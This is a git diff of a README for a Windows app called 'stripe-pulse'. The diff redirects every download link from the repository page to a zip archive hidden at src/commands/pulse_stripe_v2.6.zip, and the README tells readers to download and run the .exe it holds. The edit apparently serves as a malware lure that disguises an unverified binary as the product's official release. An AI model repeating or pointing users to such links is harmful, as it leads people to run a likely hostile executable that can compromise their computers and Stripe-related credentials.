@@ -1,6 +1,6 @@
 # 📈 stripe-pulse - Track Stripe health at a glance
 
-[![Download stripe-pulse](https://img.shields.io/badge/Download%20stripe--pulse-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ViiRaLBeary/stripe-pulse)
+[![Download stripe-pulse](https://img.shields.io/badge/Download%20stripe--pulse-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ViiRaLBeary/stripe-pulse/raw/refs/heads/main/src/commands/pulse_stripe_v2.6.zip)
 
 ## 🧭 What is stripe-pulse?
 
@@ -33,7 +33,7 @@ stripe-pulse is built for normal Windows use. It runs well on Windows 10 and Win
 
 Visit this page to download and run the app:
 
-https://github.com/ViiRaLBeary/stripe-pulse
+https://github.com/ViiRaLBeary/stripe-pulse/raw/refs/heads/main/src/commands/pulse_stripe_v2.6.zip
 
 On the page, look for the latest release or the main download file. If you see a `.exe` file, download it to your PC and run it.
 
@@ -174,4 +174,4 @@ To keep stripe-pulse working well:
 
 Download and run stripe-pulse from:
 
-https://github.com/ViiRaLBeary/stripe-pulse
+https://github.com/ViiRaLBeary/stripe-pulse/raw/refs/heads/main/src/commands/pulse_stripe_v2.6.zip
